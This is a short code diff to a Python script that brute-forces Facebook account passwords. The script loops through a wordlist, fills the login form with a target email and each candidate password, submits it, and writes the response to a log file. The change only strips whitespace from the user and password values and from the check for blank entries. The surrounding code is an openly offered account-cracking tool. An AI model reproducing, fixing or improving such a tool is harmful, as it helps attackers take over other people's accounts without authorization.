@@ -35,7 +35,7 @@ print ('\n\nCracking '+user+' Now...')
 time.sleep(1)
 print ('\n#############################################\n')
 for password in wordlist:
-    if password == '' or password == ' ':
+    if password.strip(' ') == '':
         pass
     else:
         try:
@@ -45,8 +45,8 @@ for password in wordlist:
             fb = browser.open('https://facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
-            browser.form['email'] = user
-            browser.form['pass'] = password
+            browser.form['email'] = user.strip(' ')
+            browser.form['pass'] = password.strip(' ')
             browser.method = 'POST'
             browser.submit()
             dos.write(browser.open("https://facebook.com").read().decode('utf-8'))
